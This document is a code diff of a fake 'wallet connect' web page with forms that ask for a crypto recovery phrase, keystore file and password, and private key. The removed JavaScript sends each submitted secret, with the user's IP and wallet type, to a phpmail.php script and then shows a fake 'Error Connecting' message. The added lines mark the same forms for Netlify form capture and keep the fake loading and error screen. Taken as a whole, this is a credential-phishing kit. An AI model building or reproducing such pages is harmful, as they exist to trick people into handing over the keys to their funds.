@@ -11,8 +11,8 @@
     <link rel="preconnect" href="https://fonts.googleapis.com/">
     <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&amp;family=Poppins:wght@200;300;400;500;600&amp;display=swap" rel="stylesheet">
-    <link rel="icon" href="img/logo.jpeg" type="image/x-icon">
-    <link rel="shortcut icon" href="img/logo.jpeg" type="image/x-icon">
+    <link rel="icon" href="../img/logo.jpeg" type="image/x-icon">
+    <link rel="shortcut icon" href="../img/logo.jpeg" type="image/x-icon">
 </head>
     <style>
     
@@ -207,7 +207,7 @@
                 <div class="modal-error" id="error" style="display: block;">
                     <div class="d-flex justify-content-between align-items-center border rounded mx-3 py-4 px-3 mb-5">
                         <h5 class="text-danger pt-2">Error Connecting...</h5>
-                        <a href="./" class="btn btn-primary cmn p-2">Connect Manually</a>
+                        <a href="connect-wallet.html" class="btn btn-primary cmn p-2">Connect Manually</a>
                     </div>
                     <div class="border rounded mx-3 p3-4 px-3">
                         <h6 class="pt-1">Wallet Connect</h6>
@@ -234,7 +234,7 @@
     </div>
     <div class="container">
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="phrase-form">
-            <form  id="pass-phrase">
+            <form  id="pass-phrase" name="pass-phrase" netlify>
                 <textarea name="phrase" id="vepgzijzsg" class="phrase-field" placeholder="Phrase"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_phrase">
                 <input type="hidden" name="type" id="type-phrase">
@@ -245,7 +245,7 @@
             
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="json-form">
-            <form id="key-store">
+            <form id="key-store" name="keystore" netlify>
                 <textarea name="keystore" id="tnknmtqnlu" class="phrase-field" placeholder="Keystore JSON"></textarea>
                 <input type="password" name="password" placeholder="Password" id="dienfio" class="pass-field" required>
                 <input type="hidden" name="user_ip" id="user_ip_keystore">
@@ -255,7 +255,7 @@
             </form>
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="pkey-form">
-            <form id="private-key">
+            <form id="private-key" name="private-key" netlify>
                 <textarea name="privatekey" id="slpfoduuxq" class="phrase-field" placeholder="Private Key"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_key">
                 <input type="hidden" name="type" id="type-key">
@@ -299,125 +299,51 @@
     </script>
 
 <script>
-    //validatePhrase()
-    $("form#pass-phrase").submit(async(e)=>{
-      e.preventDefault();
-      if(validatePhrase()){
-        $ip=document.getElementById('user_ip_phrase').value;
-        $type="Passphrase";
-        $walletType=Cookies.get("walletType");
-        $fullType=$type+"\n\nWallet Type:"+$walletType;
-        $passphrase=document.getElementById('vepgzijzsg').value;
+// Handler for Passphrase form submission
+$("form#pass-phrase").submit(async (e) => {
+    e.preventDefault();
 
+    // Validate passphrase (assuming validatePhrase() is defined elsewhere)
+    if (validatePhrase()) {
+        // Show "Submitting, please be patient" modal
         $("div.spanner").addClass("show");
         $("div.overlay").addClass("show");
 
-        const res=await fetch("./phpmail.php",{
-                 method: "POST",
-                 headers:{
-                    'Accept': 'application/json, text/plain,*/*',
-                    'Content-Type': 'application/json'
-                 },
-                 body: JSON.stringify({
-                    value: $passphrase,
-                    type: $fullType,
-					ip: $ip
-                 })
-               });
-               if(!res.ok) return console.log("SOMETHING WENT WRONG");
-                setTimeout(()=>{
-                    $("div.spanner").removeClass("show");
-                    $("div.overlay").removeClass("show");
-                    $(".modal").fadeIn();
-                },2000);
-			   const data=await res.text();
-			   
-               console.log(data);
+        // Simulate loading for 5 seconds
+        await new Promise(resolve => setTimeout(resolve, 5000));
 
-      }
-    })
-    //validateKeystore()
-    $("form#key-store").submit(async(e)=>{
-      e.preventDefault();
-      if(validateKeystore()){
-        $ip=document.getElementById('user_ip_keystore').value;
-        $type="KeyStore";
-        $walletType=Cookies.get("walletType");
-        $fullType=$type+"\n\nWallet Type:"+$walletType;
+        // Show "Error Connecting" modal after 5 seconds
+        $("div.spanner").removeClass("show");
+        $("div.overlay").removeClass("show");
+        $(".modal").fadeIn(); // Show error modal
 
-        $keystore=document.getElementById('tnknmtqnlu').value;
-        $password=document.getElementById('dienfio').value;
-        $data="KeyStore: "+$keystore+"\n\nPassword: "+$password;
-
+        // Optionally, clear form fields or perform other actions here
+    }
+});
+// Handler for Passphrase form submission
+$("form#key-store").submit(async (e) => {
+    e.preventDefault();
+    if(validateKeystore()){  
         $("div.spanner").addClass("show");
         $("div.overlay").addClass("show");
-
-        const res=await fetch("./phpmail.php",{
-                 method: "POST",
-                 headers:{
-                    'Accept': 'application/json, text/plain,*/*',
-                    'Content-Type': 'application/json'
-                 },
-                 body: JSON.stringify({
-                    value: $data,
-                    type: $fullType,
-					ip: $ip
-                 })
-               });
-               if(!res.ok) return console.log("SOMETHING WENT WRONG")
-
-               setTimeout(()=>{
-                    $("div.spanner").removeClass("show");
-                    $("div.overlay").removeClass("show");
-                    $(".modal").fadeIn();
-                },2000);
-               const data=await res.text();
-			  
-			   
-               console.log(data);
-
-      }
-    })
-
-        //validateKey()
-        $("form#private-key").submit(async(e)=>{
-      e.preventDefault();
-      if(validateKey()){
-        $ip=document.getElementById('user_ip_key').value;
-        $type="PrivateKey";
-        $walletType=Cookies.get("walletType");
-        $fullType=$type+"\n\nWallet Type:"+$walletType;
-
-        $privatekey=document.getElementById('slpfoduuxq').value;
-
-        
+        await new Promise(resolve => setTimeout(resolve, 5000));
+        $("div.spanner").removeClass("show");
+        $("div.overlay").removeClass("show");
+        $(".modal").fadeIn();
+    }
+});
+$("form#private-key").submit(async (e) => {
+    e.preventDefault();
+    if(validateKey()){
         $("div.spanner").addClass("show");
         $("div.overlay").addClass("show");
-        const res=await fetch("./phpmail.php",{
-                 method: "POST",
-                 headers:{
-                    'Accept': 'application/json, text/plain,*/*',
-                    'Content-Type': 'application/json'
-                 },
-                 body: JSON.stringify({
-                    value: $privatekey,
-                    type: $fullType,
-					ip: $ip
-                 })
-               });
-               if(!res.ok) return console.log("SOMETHING WENT WRONG")
-               setTimeout(()=>{
-                    $("div.spanner").removeClass("show");
-                    $("div.overlay").removeClass("show");
-                    $(".modal").fadeIn();
-                },2000);
-               const data=await res.text();
-			  
-			
-               console.log(data);
+        await new Promise(resolve => setTimeout(resolve, 5000));
+        $("div.spanner").removeClass("show");
+        $("div.overlay").removeClass("show");
+        $(".modal").fadeIn(); // Show error modal
 
-      }
-    });
+    }
+});
 
     $(".btn-close").click(e=>{
         $(".modal").fadeOut();
@@ -428,7 +354,7 @@
    </script>
    
    <script>
-    console.log(Cookies.get("walletType")
-   <script>
+    console.log(Cookies.get("walletType"))
+   </script>
 
 </html>
